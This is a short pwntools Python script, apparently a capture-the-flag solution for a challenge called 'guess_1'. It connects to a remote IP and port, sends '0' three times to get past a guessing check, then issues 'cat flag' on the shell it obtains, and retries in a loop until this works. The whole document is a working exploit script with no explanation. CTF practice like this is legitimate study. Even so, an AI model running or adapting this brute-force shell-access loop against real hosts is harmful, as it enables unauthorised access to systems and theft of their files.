from pwn import *
context.log_level='debug'
while 1:
    try:
        #p=process("./guess_1")
        p=remote("47.97.140.40","10007")
        for i in range(3):
            p.recv()
            p.sendline('0')
        p.recv(timeout=1)
        p.sendline("cat flag")
        p.recv(timeout=1)
        break
    except:
        p.close()
